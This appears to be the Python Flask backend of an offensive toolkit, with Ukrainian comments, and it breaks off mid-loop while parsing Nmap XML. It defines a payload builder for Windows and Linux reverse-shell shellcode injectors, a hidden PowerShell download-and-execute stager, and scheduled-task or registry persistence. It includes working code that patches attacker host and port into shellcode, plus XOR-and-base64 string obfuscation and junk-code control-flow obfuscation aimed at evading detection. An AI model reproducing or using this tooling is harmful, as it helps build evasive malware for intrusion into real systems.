# Syntax Flask Backend - Segment SFB-CORE-1.9.6
# Призначення: Backend на Flask з розширеним Nmap (сканування скриптами вразливостей).
# Оновлення v1.9.6:
#   - Покращено parse_nmap_xml_output_for_services для вилучення деталей виводу скриптів Nmap.
#   - Оновлено handle_run_recon для port_scan_nmap_vuln_scripts для генерації форматованого текстового звіту
#     на основі розібраних даних скриптів, замість простого повернення XML.
#   - Оновлено VERSION_BACKEND до "1.9.6".

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import base64
import re
import random
import string
import time
from datetime import datetime
import subprocess
import shlex
import ipaddress
import socket
import xml.etree.ElementTree as ET
import tempfile
import os
import uuid
import shutil

VERSION_BACKEND = "1.9.6" # Оновлено версію

simulated_implants_be = []
pending_tasks_for_implants = {}
exfiltrated_file_chunks_db = {}

CONCEPTUAL_CVE_DATABASE_BE = {
    "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
    "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
    "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
    "proftpd 1.3.5e": [{"cve_id": "CVE-2019-12815", "severity": "HIGH", "summary": "ProFTPD 1.3.5e and earlier is affected by an arbitrary file copy vulnerability..."}],
    "mysql 5.7.30": [{"cve_id": "CVE-2020-14812", "severity": "HIGH", "summary": "Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: DDL)."}],
    "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
}

def initialize_simulated_implants_be():
    global simulated_implants_be, pending_tasks_for_implants, exfiltrated_file_chunks_db
    simulated_implants_be = []
    pending_tasks_for_implants = {}
    exfiltrated_file_chunks_db = {}
    os_types = ["Windows_x64_10.0.22631", "Linux_x64_6.5.0", "Windows_Server_2022_Datacenter", "macOS_sonoma_14.1_arm64"]
    base_ip_prefixes = ["10.30.", "192.168.", "172.22."]
    num_implants = random.randint(4, 7)
    for i in range(num_implants):
        implant_id = f"SYNIMPLNT-ADV-{random.randint(10000,99999)}-{random.choice(string.ascii_uppercase)}"
        ip_prefix = random.choice(base_ip_prefixes)
        ip_address = f"{ip_prefix}{random.randint(10,250)}.{random.randint(10,250)}"
        os_type = random.choice(os_types)
        last_seen_timestamp = time.time() - random.randint(600, 12000)
        last_seen_str = datetime.fromtimestamp(last_seen_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        simulated_implants_be.append({
            "id": implant_id, "ip": ip_address, "os": os_type,
            "lastSeen": last_seen_str,
            "status": random.choice(["pending_beacon", "idle_monitoring", "task_in_progress"]),
            "files": [],
            "beacon_interval_sec": random.randint(30, 120)
        })
    simulated_implants_be.sort(key=lambda x: x["id"])
    print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань та базу ексфільтрованих файлів очищено.")

CONCEPTUAL_PARAMS_SCHEMA_BE = {
    "payload_archetype": {
        "type": str, "required": True,
        "allowed_values": [
            "demo_echo_payload",
            "demo_file_lister_payload",
            "demo_c2_beacon_payload",
            "reverse_shell_tcp_shellcode_windows_x64",
            "reverse_shell_tcp_shellcode_linux_x64",
            "powershell_downloader_stager",
            "dns_beacon_c2_concept",
            "windows_simple_persistence_stager"
        ]
    },
    "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
    "directory_to_list": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_file_lister_payload", "default": "."},
    "c2_target_host": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") in [
            "reverse_shell_tcp_shellcode_windows_x64",
            "reverse_shell_tcp_shellcode_linux_x64"
        ],
        "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
    },
    "c2_target_port": {
        "type": int,
        "required": lambda params: params.get("payload_archetype") in [
            "reverse_shell_tcp_shellcode_windows_x64",
            "reverse_shell_tcp_shellcode_linux_x64"
        ],
        "allowed_range": (1, 65535)
    },
    "c2_beacon_endpoint": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "demo_c2_beacon_payload",
        "default": "http://localhost:5000/api/c2/beacon_receiver",
        "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+(:\d+)?(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$"
    },
    "c2_dns_zone": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "dns_beacon_c2_concept",
        "default": "syntax-c2.net",
        "validation_regex": r"^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
    },
    "dns_beacon_subdomain_prefix": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "dns_beacon_c2_concept",
        "default": "api",
        "validation_regex": r"^[a-zA-Z0-9][a-zA-Z0-9\-]*$"
    },
    "shellcode_hex_placeholder": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") in [
            "reverse_shell_tcp_shellcode_windows_x64",
            "reverse_shell_tcp_shellcode_linux_x64"
        ],
        "default": "DEADBEEFCAFE"
    },
    "powershell_script_url": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "powershell_downloader_stager",
        "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$"
    },
    "powershell_execution_args": {
        "type": str,
        "required": False,
        "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass"
    },
    "persistence_method": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
        "allowed_values": ["scheduled_task", "registry_run_key"],
        "default": "scheduled_task"
    },
    "command_to_persist": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
        "min_length": 1,
        "default": "calc.exe"
    },
    "artifact_name": {
        "type": str,
        "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
        "min_length": 3,
        "default": "SyntaxUpdater",
        "validation_regex": r"^[a-zA-Z0-9_.-]+$"
    },
    "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
    "output_format": {
        "type": str, "required": False,
        "allowed_values": ["raw_python_stager", "base64_encoded_stager", "pyinstaller_exe_windows"],
        "default": "raw_python_stager"
    },
    "pyinstaller_options": {
        "type": str,
        "required": False,
        "default": "--onefile --noconsole"
    },
    "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
    "enable_evasion_checks": {"type": bool, "required": False, "default": True},
    "enable_amsi_bypass_concept": {"type": bool, "required": False, "default": True},
    "enable_disk_size_check": {"type": bool, "required": False, "default": True}
}
CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
    "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
    "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
    "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST з виконанням завдань та ексфільтрацією)", "template_type": "python_stager_http_c2_beacon"},
    "reverse_shell_tcp_shellcode_windows_x64": {
        "description": "Windows x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
        "template_type": "python_stager_shellcode_injector_win_x64"
    },
    "reverse_shell_tcp_shellcode_linux_x64": {
        "description": "Linux x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
        "template_type": "python_stager_shellcode_injector_linux_x64"
    },
    "powershell_downloader_stager": {
        "description": "Windows PowerShell Downloader (Завантажує та виконує PS1 з URL)",
        "template_type": "python_stager_powershell_downloader"
    },
    "dns_beacon_c2_concept": {
        "description": "Концептуальний C2-маячок через DNS (симуляція передачі завдань)",
        "template_type": "python_stager_dns_c2_beacon"
    },
    "windows_simple_persistence_stager": {
        "description": "Windows Stager для простої персистентності (Scheduled Task або Registry Run Key)",
        "template_type": "python_stager_windows_persistence"
    }
}

def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple[bool, dict, list[str]]:
    # ... (Код валідації без змін від v1.9.5) ...
    validated_params = {}
    errors = []
    for param_name, rules in schema.items():
        if param_name in input_params:
            value_to_validate = input_params[param_name]
            if rules.get("type") == int and not isinstance(value_to_validate, int):
                try: value_to_validate = int(value_to_validate)
                except (ValueError, TypeError): pass
            elif rules.get("type") == bool and not isinstance(value_to_validate, bool):
                 if isinstance(value_to_validate, str):
                    if value_to_validate.lower() == 'true': value_to_validate = True
                    elif value_to_validate.lower() == 'false': value_to_validate = False
            validated_params[param_name] = value_to_validate
        elif "default" in rules:
            is_cond_req_missing = False
            if callable(rules.get("required")):
                if rules["required"](input_params) and param_name not in input_params:
                    is_cond_req_missing = True
            if not is_cond_req_missing: validated_params[param_name] = rules["default"]
    for param_name, rules in schema.items():
        is_required_directly = rules.get("required") is True
        is_conditionally_required = callable(rules.get("required")) and rules["required"](validated_params if validated_params.get("payload_archetype") else input_params)
        if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
            errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
            continue
        if param_name in validated_params:
            value = validated_params[param_name]
            if "type" in rules and not isinstance(value, rules["type"]):
                errors.append(f"Параметр '{param_name}' має невірний тип. Очікується {rules['type'].__name__}, отримано {type(value).__name__}.")
                continue
            if "allowed_values" in rules and value not in rules["allowed_values"]:
                errors.append(f"Значення '{value}' для параметра '{param_name}' не є дозволеним. Дозволені: {rules['allowed_values']}.")
            if "min_length" in rules and isinstance(value, str) and len(value) < rules["min_length"]:
                 errors.append(f"Параметр '{param_name}' закороткий. Мін. довжина: {rules['min_length']}.")
            if "allowed_range" in rules and rules.get("type") in [int, float]:
                min_val, max_val = rules["allowed_range"]
                if not (min_val <= value <= max_val):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' виходить за межі ({min_val}-{max_val}).")
            if "validation_regex" in rules and rules.get("type") is str:
                if not re.match(rules["validation_regex"], value):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' не відповідає формату: {rules['validation_regex']}.")
    return not errors, validated_params, errors


def xor_cipher(data_str: str, key: str) -> str:
    # ... (Код без змін) ...
    if not key: key = "DefaultXOR_Key_v3"
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data_str)])

def b64_encode_str(data_str: str) -> str:
    # ... (Код без змін) ...
    return base64.b64encode(data_str.encode('latin-1')).decode('utf-8')

def generate_random_var_name(length=10, prefix="syn_var_"):
    # ... (Код без змін) ...
    return prefix + ''.join(random.choice(string.ascii_lowercase + '_') for _ in range(length))

def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_messages: list) -> str:
    # ... (Код без змін) ...
    log_messages.append(f"[SHELLCODE_PATCH_INFO] Початок патчингу шеллкоду. LHOST: {lhost_str}, LPORT: {lport_int}")
    patched_shellcode_hex = shellcode_hex
    lhost_placeholder_fixed_hex = "DEADBEEF"
    if lhost_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            ip_addr_bytes = ipaddress.ip_address(lhost_str).packed
            ip_addr_hex = ip_addr_bytes.hex()
            if len(ip_addr_hex) == 8:
                patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
                log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_WARN] Не вдалося підготувати LHOST для заміни (неправильна довжина IP hex: {len(ip_addr_hex)}).")
        except ValueError:
            log_messages.append(f"[SHELLCODE_PATCH_ERROR] Невірний формат LHOST: {lhost_str}.")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_ERROR] Помилка під час патчингу LHOST: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено.")
    lport_placeholder_fixed_hex = "CAFE"
    if lport_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            lport_bytes = socket.htons(lport_int).to_bytes(2, byteorder='big')
            lport_hex_network_order = lport_bytes.hex()
            if len(lport_hex_network_order) == 4:
                patched_shellcode_hex = patched_shellcode_hex.replace(lport_placeholder_fixed_hex, lport_hex_network_order)
                log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LPORT '{lport_placeholder_fixed_hex}' замінено на '{lport_hex_network_order}'.")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_WARN] Не вдалося підготувати LPORT для заміни (неправильна довжина LPORT hex: {len(lport_hex_network_order)}).")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_ERROR] Помилка під час патчингу LPORT: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_INFO] Стандартний 2-байтовий заповнювач LPORT ('{lport_placeholder_fixed_hex}') не знайдено.")
    if patched_shellcode_hex == shellcode_hex:
        log_messages.append("[SHELLCODE_PATCH_INFO] Шеллкод не було змінено (заповнювачі не знайдено або помилки).")
    return patched_shellcode_hex

def obfuscate_string_literals_in_python_code(code: str, key: str, log_messages: list) -> str:
    # ... (Код без змін) ...
    string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
    found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
    if not found_literals_matches:
        log_messages.append("[METAMORPH_INFO] Рядкових літералів для обфускації не знайдено.")
        return code
    decoder_func_name = generate_random_var_name(prefix="unveil_")
    decoder_func_code = f"""
import base64 as b64_rt_decoder
def {decoder_func_name}(s_b64, k_s):
    try:
        d_b = b64_rt_decoder.b64decode(s_b64.encode('utf-8'))
        d_s = d_b.decode('latin-1')
        o_c = []
        for i_c in range(len(d_s)):
            o_c.append(chr(ord(d_s[i_c]) ^ ord(k_s[i_c % len(k_s)])))
        return "".join(o_c)
    except Exception: return s_b64
"""
    obfuscated_count = 0
    definitions_to_add = []
    replacements = []
    for match in found_literals_matches:
        literal_group = next(g for g in match.groups() if g is not None)
        full_match_str = match.group(0)
        python_keywords = set(["False", "None", "True", "and", "as", "assert", "async", "await", "break", "class", "continue", "def", "del", "elif", "else", "except", "finally", "for", "from", "global", "if", "import", "in", "is", "lambda", "nonlocal", "not", "or", "pass", "raise", "return", "try", "while", "with", "yield", "__main__", "__name__"])
        if len(literal_group) < 3 or literal_group in python_keywords or literal_group.isidentifier() or \
           '{' in literal_group or '}' in literal_group or '%' in literal_group or \
           full_match_str.startswith("f\"") or full_match_str.startswith("f'"):
            continue
        obfuscated_s_xor = xor_cipher(literal_group, key)
        obfuscated_s_b64 = b64_encode_str(obfuscated_s_xor)
        var_name = generate_random_var_name(prefix="obf_str_")
        definitions_to_add.append(f"{var_name} = {decoder_func_name}(\"{obfuscated_s_b64}\", OBFUSCATION_KEY_EMBEDDED)")
        replacements.append((match.span(), var_name))
        obfuscated_count +=1
    if obfuscated_count > 0:
        import_lines_end_pos = 0
        for match_imp in re.finditer(r"^(?:import|from) .*?(?:\n|$)", code, re.MULTILINE):
            import_lines_end_pos = match_imp.end()
        code_before_imports_and_globals = code[:import_lines_end_pos]
        code_after_decoder_insertion = code_before_imports_and_globals + "\n" + decoder_func_code
        definitions_block = "\n" + "\n".join(definitions_to_add) + "\n"
        code_with_definitions = code_after_decoder_insertion + definitions_block
        code_original_main_logic = code[import_lines_end_pos:]
        temp_main_logic = code_original_main_logic
        for (start_orig, end_orig), var_name_rep in sorted(replacements, key=lambda x: x[0][0], reverse=True):
            start_rel = start_orig - import_lines_end_pos
            end_rel = end_orig - import_lines_end_pos
            if start_rel >= 0:
                 temp_main_logic = temp_main_logic[:start_rel] + var_name_rep + temp_main_logic[end_rel:]
        modified_code = code_with_definitions + temp_main_logic
        log_messages.append(f"[METAMORPH_INFO] Обфусковано {obfuscated_count} рядкових літералів. Функція-декодер: {decoder_func_name}")
    else:
        log_messages.append("[METAMORPH_INFO] Рядкових літералів для обфускації не знайдено (після фільтрації).")
        modified_code = code
    return modified_code

def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
    # ... (Код без змін) ...
    transformed_code_list = []
    cfo_applied_count = 0
    junk_code_count = 0
    for line_idx, line in enumerate(code_lines):
        transformed_code_list.append(line)
        current_indent = line[:len(line) - len(line.lstrip())]
        if random.random() < 0.15 and line.strip() and not line.strip().startswith("#") and len(line.strip()) > 3 :
            junk_var1 = generate_random_var_name(prefix="jnk_var_")
            junk_var2 = generate_random_var_name(prefix="tmp_dat_")
            junk_ops = [
                f"{current_indent}{junk_var1} = {random.randint(1000, 9999)} * {random.randint(1,10)} # Junk arithmetics {random.randint(0,100)}",
                f"{current_indent}{junk_var2} = list(range({random.randint(1,3)})) # Junk list op {random.randint(0,100)}",
                f"{current_indent}# Junk comment {generate_random_var_name(15, '')}",
                f"{current_indent}if {random.choice([True, False])}: pass # Simple junk if"
            ]
            transformed_code_list.append(random.choice(junk_ops))
            junk_code_count +=1
        if random.random() < 0.25 and line.strip() and \
           not line.strip().startswith("#") and \
           "def " not in line and "class " not in line and \
           "if __name__" not in line and "import " not in line and \
           "return " not in line and not line.strip().endswith(":") and \
           not line.strip().startswith("OBFUSCATION_KEY_EMBEDDED"):
            r1, r2 = random.randint(1,100), random.randint(1,100)
            cfo_type = random.randint(1, 6)
            cfo_block_lines = [f"{current_indent}# --- CFO Block Type {cfo_type} Inserted ---"]
            if cfo_type == 1:
                cfo_block_lines.append(f"{current_indent}if {r1} * {random.randint(1,5)} > {r1-1000}: # Opaque True {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v1_')} = {r1} ^ {r2}")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead1_')} = {r1}+{r2} # Dead code")
            elif cfo_type == 2:
                cfo_block_lines.append(f"{current_indent}if str({r1}) == str({r1 + 1}): # Opaque False {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead2_')} = {r1}-{r2} # Dead code")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v2_')} = {r2} | {r1}")
            elif cfo_type == 3:
                loop_var = generate_random_var_name(1, '_lp')
                cfo_block_lines.append(f"{current_indent}for {loop_var} in range({random.randint(1,3)}): # Junk Loop {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='iter_jnk_')} = str({loop_var} * {r1}) + \"_{r2}\"")
                cfo_block_lines.append(f"{current_indent}    if {loop_var} > 5: break # Unlikely break")
            elif cfo_type == 4:
                v_a, v_b = generate_random_var_name(prefix="cfa_op_"), generate_random_var_name(prefix="cfb_op_")
                cfo_block_lines.append(f"{current_indent}{v_a} = ({r1} << {random.randint(0,2)}) + {random.randint(0,10)}")
                cfo_block_lines.append(f"{current_indent}{v_b} = {v_a} ^ {r2 if r2 !=0 else 1}")
                cfo_block_lines.append(f"{current_indent}if {v_b} % ({r2 if r2 !=0 else 1}) != {v_a} % ({r2 if r2 !=0 else 1}): # Opaque True (complex) {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    pass")
            elif cfo_type == 5:
                cfo_block_lines.append(f"{current_indent}if True: # Outer always true {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    if {r1} < {r1 // 2 if r1 > 0 else -1}: # Inner likely false")
                cfo_block_lines.append(f"{current_indent}        {generate_random_var_name(prefix='dead_path_')} = 'unreachable'")
                cfo_block_lines.append(f"{current_indent}    else:")
                cfo_block_lines.append(f"{current_indent}        pass # Real path")
            elif cfo_type == 6:
                 func_name_cfo = generate_random_var_name(prefix="cfo_sub_")
                 sub_var_name_cfo = generate_random_var_name(prefix='sub_var_')
                 cfo_block_lines.append(f"{current_indent}def {func_name_cfo}():")
                 cfo_block_lines.append(f"{current_indent}    {sub_var_name_cfo} = {r1}%({r2 if r2!=0 else 1})")
                 cfo_block_lines.append(f"{current_indent}    return {sub_var_name_cfo}")
                 cfo_block_lines.append(f"{current_indent}{generate_random_var_name(prefix='res_')} = {func_name_cfo}()")
            cfo_block_lines.append(f"\n{current_indent}# --- CFO Block End {random.randint(0,100)} ---")
            transformed_code_list.extend(cfo_block_lines)
            cfo_applied_count +=1
    log_messages.append(f"[METAMORPH_DEBUG] Застосовано CFO блоків: {cfo_applied_count}, Сміттєвого коду: {junk_code_count}.")
    return "\n".join(transformed_code_list)

def get_service_name_be(port: int) -> str:
    # ... (Код без змін) ...
    services = { 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 443: "HTTPS", 3306: "MySQL", 3389: "RDP", 8080: "HTTP-Alt" }
    return services.get(port, "Unknown")

def simulate_port_scan_be(target: str) -> tuple[list[str], str]:
    # ... (Код без змін) ...
    log = [f"[RECON_BE_INFO] Імітація сканування портів для цілі: {target}"]
    results_text_lines = [f"Результати сканування портів для: {target}"]
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443]
    open_ports_found = []
    for port in common_ports:
        time.sleep(random.uniform(0.01, 0.05))
        if random.random() < 0.3:
            service_name = get_service_name_be(port)
            banner = ""
            if random.random() < 0.6:
                banner_version = f"v{random.randint(1,5)}.{random.randint(0,9)}"
                possible_banners = [f"OpenSSH_{banner_version}", f"Apache httpd {banner_version}", f"Microsoft-IIS/{banner_version}", "nginx", f"ProFTPD {banner_version}", f"vsftpd {banner_version}", f"MySQL {banner_version}", f"PostgreSQL {banner_version}"]
                banner = f" (Banner: {random.choice(possible_banners)})"
            open_ports_found.append(f"  Порт {port} ({service_name}): ВІДКРИТО{banner}")
    if open_ports_found: results_text_lines.extend(open_ports_found)
    else: results_text_lines.append("  Відкритих поширених портів не знайдено (імітація).")
    log.append("[RECON_BE_SUCCESS] Імітацію сканування портів завершено.")
    return log, "\n".join(results_text_lines)

def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
    # ... (Код без змін) ...
    log = [f"[RECON_BE_INFO] Імітація OSINT пошуку email для домену: {target_domain}"]
    results_text_lines = [f"Результати OSINT пошуку Email для домену: {target_domain}"]
    domain_parts = target_domain.split('.')
    main_domain = ".".join(domain_parts[-2:]) if len(domain_parts) > 2 else target_domain
    common_names = ["info", "support", "admin", "contact", "sales", "hr", "abuse", "webmaster"]
    first_names = ["john.doe", "jane.smith", "peter.jones", "susan.lee", "michael.brown"]
    found_emails = []
    for _ in range(random.randint(1, 5)):
        email = f"{random.choice(common_names)}@{main_domain}" if random.random() < 0.7 else f"{random.choice(first_names)}@{main_domain}"
        if email not in found_emails: found_emails.append(email)
    if found_emails: results_text_lines.extend([f"  Знайдено Email: {email}" for email in found_emails])
    else: results_text_lines.append("  Email-адрес не знайдено (імітація).")
    log.append("[RECON_BE_SUCCESS] Імітацію OSINT пошуку email завершено.")
    return log, "\n".join(results_text_lines)

def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], str]:
    # ... (Код без змін) ...
    log = [f"[RECON_BE_INFO] Імітація OSINT пошуку субдоменів для домену: {target_domain}"]
    results_text_lines = [f"Результати OSINT пошуку Субдоменів для домену: {target_domain}"]
    cleaned_domain = re.sub(r"^(www|ftp|mail)\.", "", target_domain, flags=re.IGNORECASE)
    common_subdomains_prefixes = [
        "www", "mail", "ftp", "webmail", "cpanel", "blog", "dev", "stage", "test", "api",
        "shop", "store", "secure", "vpn", "remote", "portal", "owa", "autodiscover",
        "admin", "dashboard", "app", "beta", "alpha", "db", "assets", "static", "cdn",
        "intranet", "support", "helpdesk", "status", "git", "svn", "m", "mta", "ns1", "ns2"
    ]
    found_subdomains_list = set()
    for sub_prefix in common_subdomains_prefixes:
        if random.random() < 0.20:
            found_subdomains_list.add(f"{sub_prefix}.{cleaned_domain}")
    for _ in range(random.randint(0, 2)):
        prefix_part1 = random.choice(["data", "svc", "internal", "ext", "prod", "dev-app", "user"])
        prefix_part2 = random.choice(["01", "02", "new", "sys", str(random.randint(1,3))])
        if random.random() < 0.5:
            found_subdomains_list.add(f"{prefix_part1}-{prefix_part2}.{cleaned_domain}")
        else:
            found_subdomains_list.add(f"{prefix_part1}{random.randint(1,9)}.{cleaned_domain}")
    if not found_subdomains_list and cleaned_domain:
        found_subdomains_list.add(f"www.{cleaned_domain}")
        found_subdomains_list.add(f"mail.{cleaned_domain}")

    if found_subdomains_list:
        results_text_lines.extend([f"  Знайдено Субдомен: {sub}" for sub in sorted(list(found_subdomains_list))])
    else:
        results_text_lines.append(f"  Субдоменів для '{cleaned_domain}' не знайдено (імітація).")
    log.append("[RECON_BE_SUCCESS] Імітацію OSINT пошуку субдоменів завершено.")
    return log, "\n".join(results_text_lines)

def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]:
    # Функція оновлена для вилучення деталей скриптів
    parsed_services = []
    parsed_os_info = []
    try:
        log_messages.append("[NMAP_XML_PARSE_INFO] Початок парсингу XML-виводу nmap.")
        if not nmap_xml_output.strip():
            log_messages.append("[NMAP_XML_PARSE_WARN] XML-вивід порожній.")
            return parsed_services, parsed_os_info
        root = ET.fromstring(nmap_xml_output)
        for host_node in root.findall('host'):
            address_node = host_node.find('address')
            host_ip = address_node.get('addr') if address_node is not None else "N/A"
            
            # Парсинг інформації про ОС
            os_node = host_node.find('os')
            if os_node is not None:
                for osmatch_node in os_node.findall('osmatch'):
                    os_name = osmatch_node.get('name', 'Unknown OS')
                    accuracy = osmatch_node.get('accuracy', 'N/A')
                    os_class_node = osmatch_node.find('osclass')
                    os_family = os_class_node.get('osfamily', '') if os_class_node is not None else ''
                    os_gen = os_class_node.get('osgen', '') if os_class_node is not None else ''
                    cpe_nodes = os_class_node.findall('cpe') if os_class_node is not None else []
                    os_cpes = [cpe.text for cpe in cpe_nodes if cpe.text]
                    parsed_os_info.append({
                        "host_ip": host_ip, "name": os_name, "accuracy": accuracy,
                        "family": os_family, "generation": os_gen, "cpes": os_cpes
                    })
                    log_messages.append(f"[NMAP_XML_PARSE_OS] Знайдено ОС: {os_name} (Точність: {accuracy}) для хоста {host_ip}")

            # Парсинг інформації про порти та сервіси
            ports_node = host_node.find('ports')
            if ports_node is None:
                continue
            for port_node in ports_node.findall('port'):
                state_node = port_node.find('state')
                if state_node is None or state_node.get('state') != 'open':
                    continue
                port_id = port_node.get('portid')
                protocol = port_node.get('protocol')
                service_node = port_node.find('service')
                service_name = service_node.get('name', 'unknown') if service_node is not None else 'unknown'
                product_name = service_node.get('product', '') if service_node is not None else ''
                version_number = service_node.get('version', '') if service_node is not None else ''
                extrainfo = service_node.get('extrainfo', '') if service_node is not None else ''
                service_cpes = []
                if service_node is not None:
                    for cpe_node in service_node.findall('cpe'):
                        if cpe_node.text:
                            service_cpes.append(cpe_node.text)
                
                # Парсинг виводу скриптів для цього порту
                scripts_output = []
                for script_node in port_node.findall('script'):
                    script_id = script_node.get('id', 'N/A')
                    script_data = script_node.get('output', '')
                    # Додатковий парсинг для структурованих елементів всередині <script>, якщо є
                    # Наприклад, якщо скрипт vulners створює <elem key="CVE-ID">...</elem>
                    structured_script_data = {}
                    for elem_node in script_node.findall('elem'):
                        key = elem_node.get('key')
                        if key:
                            structured_script_data[key] = elem_node.text
                    # Таблиці з скриптів
                    tables_data = []
                    for table_node in script_node.findall('table'):
                        table_dict = {}
                        for elem_node in table_node.findall('elem'):
                            key = elem_node.get('key')
                            if key:
                                table_dict[key] = elem_node.text
                        if table_dict:
                            tables_data.append(table_dict)
                    
                    scripts_output.append({
                        "id": script_id, 
                        "output": script_data,
                        "structured_data": structured_script_data, # Додано
                        "tables": tables_data # Додано
                    })
                    log_messages.append(f"[NMAP_XML_PARSE_SCRIPT] Знайдено скрипт '{script_id}' для порту {port_id} на {host_ip}.")

                version_info_parts = [product_name, version_number, extrainfo]
                version_info_full = " ".join(part for part in version_info_parts if part).strip()
                if not version_info_full:
                    version_info_full = service_name
                service_key_for_cve = product_name.lower().strip() if product_name else service_name.lower().strip()
                if version_number:
                    service_key_for_cve += f" {version_number.lower().strip()}"
                if not product_name and service_name != 'unknown':
                     service_key_for_cve = service_name.lower().strip()
                     if not version_number and extrainfo:
                         version_match_extra = re.search(r"(\d+\.[\d\.\w-]+)", extrainfo)
                         if version_match_extra:
                             service_key_for_cve += f" {version_match_extra.group(1).lower().strip()}"
                parsed_services.append({
                    "host_ip": host_ip, "port": port_id, "protocol": protocol,
                    "service_name": service_name, "product": product_name,
                    "version_number": version_number, "extrainfo": extrainfo,
                    "version_info_full": version_info_full, "cpes": service_cpes,
                    "service_key_for_cve": service_key_for_cve.strip(),
                    "scripts": scripts_output  # Додано вивід скриптів
                })
        
        # Парсинг скриптів на рівні хоста (не прив'язаних до порту)
        for host_node in root.findall('host'):
